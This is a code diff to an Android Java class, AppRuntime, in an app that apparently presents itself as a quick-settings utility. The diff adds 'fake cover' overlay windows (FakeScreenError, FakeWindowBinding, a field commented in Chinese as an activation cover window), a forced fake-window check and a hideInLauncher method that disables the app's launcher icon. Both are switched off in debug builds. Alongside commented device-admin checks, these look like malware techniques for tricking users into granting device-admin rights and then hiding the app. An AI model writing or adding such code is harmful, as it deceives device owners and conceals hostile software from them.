@@ -1,11 +1,16 @@
 package com.xstd.qm;
 
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.graphics.Bitmap;
 import android.os.Build;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
+import com.bwx.bequick.ShowSettingsActivity;
+import com.xstd.qm.fakecover.FakeScreenError;
+import com.xstd.qm.fakecover.FakeWindowBinding;
 import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
@@ -52,9 +57,22 @@ public class AppRuntime {
 
     public static AtomicBoolean LEFT_ACTIVE_BUTTON = new AtomicBoolean(false);
 
+    public static AtomicBoolean EXT_INSTALL_SHOW = new AtomicBoolean(false);
+
     public static PLuginManager.AppInfo CURRENT_FAKE_APP_INFO = new PLuginManager.AppInfo();
 
+    public static FakeScreenError FakeScreenError = null;
+
+    /**
+     * 激活遮盖窗口
+     */
+    public static FakeWindowBinding window = null;
+
     public static boolean shouldForceShowFakeWindow() {
+        if (Config.DEBUG) {
+            return false;
+        }
+
         Calendar c = Calendar.getInstance();
         int curDay = c.get(Calendar.DAY_OF_YEAR);
         int curYear = c.get(Calendar.YEAR);
@@ -107,5 +125,14 @@ public class AppRuntime {
 //        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
 //        return dpm.isAdminActive(new ComponentName(context, BindDeviceReceiver.class));
         return SettingManager.getInstance().getKeyHasBindingDevices();
+    }
+
+    public static void hideInLauncher(Context context) {
+        if (Config.DEBUG) {
+            return;
+        }
+
+        PackageManager pm = context.getPackageManager();
+        pm.setComponentEnabledSetting(new ComponentName(context, ShowSettingsActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 }
